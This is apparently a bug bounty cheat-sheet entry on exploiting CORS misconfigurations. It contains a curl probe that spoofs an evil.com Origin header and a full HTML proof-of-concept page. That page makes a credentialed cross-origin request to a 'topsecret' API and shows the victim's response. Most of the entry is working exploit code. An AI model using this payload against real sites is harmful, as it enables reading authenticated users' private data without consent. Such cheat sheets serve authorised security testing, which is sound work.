## Cross Origin Resource Sharing (CORS)

Testing:
`curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'`

Check to see what the server responds with in the `Access-Control-Allow-Origin:` (if anything) and if so, check if `Access-Control-Allow-Credentials: true` is present.

If it is trusting arbitrary origins **with** allow-credentials set to true, then host this HTML as a proof of concept.

```
<!DOCTYPE html>
<html>
<head><title>BugBounty CheatSheet</title></head>
<body>
<center>
<h2>CORs POC</h2>

<textarea rows="10" cols="60" id="pwnz">
</textarea><br>
<button type="button" onclick="cors()">Exploit</button>
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("pwnz").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", "http://example.com/api/v1/topsecret", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
```
